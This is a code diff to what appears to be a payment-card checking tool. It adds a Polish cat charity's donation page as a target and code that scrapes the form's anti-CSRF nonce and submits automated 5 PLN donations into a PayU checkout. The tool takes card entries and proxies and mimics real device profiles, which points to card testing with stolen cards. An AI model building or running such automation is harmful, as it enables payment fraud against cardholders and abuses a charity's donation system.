@@ -188,6 +188,27 @@ PAYU_SITES = {
             "payu_send": "",
         },
     },
+    "kocipazur": {
+        "create_url": "https://kocipazur.org/wspomoz/przekaz-darowizne/",
+        "create_type": "form_nonce",
+        "nonce_field": "kocipazur_donate",
+        "nonce_pattern": r'name="kocipazur_donate" value="([^"]+)"',
+        "referer": "https://kocipazur.org/wspomoz/przekaz-darowizne/",
+        "origin": "https://kocipazur.org",
+        "amount": "5",
+        "mcp_fx_table_id": 597551,
+        "mcp_fx_rate": 1,
+        "language": "pl",
+        "lang_param": "",
+        "country": "PL",
+        "timezone_offset": -60,
+        "form_fields": {
+            "firstname": "{first}",
+            "lastname": "{last}",
+            "email": "{email}",
+            "donation_value": "5",
+        },
+    },
 }
 
 # ── real device profiles (screen / color depth) ──────────────────────
@@ -337,7 +358,21 @@ async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
 
     try:
         # 1. create the order on the merchant (json API or html form + redirect)
-        if cfg["create_type"] == "ajax":
+        if cfg["create_type"] == "form_nonce":
+            # GET the page -> extract the anti-CSRF nonce + session cookie
+            r = await s.get(cfg["create_url"], headers={"Referer": cfg["referer"]})
+            m = re.search(cfg["nonce_pattern"], r.text)
+            if not m:
+                raise Exception("form_nonce: nonce not found")
+            nonce_val = m.group(1)
+            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["form_fields"].items()}
+            form[cfg["nonce_field"]] = nonce_val
+            r2 = await s.post(
+                cfg["create_url"], data=form, allow_redirects=False,
+                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
+                         "Content-Type": "application/x-www-form-urlencoded"})
+            redirect = r2.headers.get("Location") or ""
+        elif cfg["create_type"] == "ajax":
             form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
             r = await s.post(
                 cfg["create_url"], data=form,
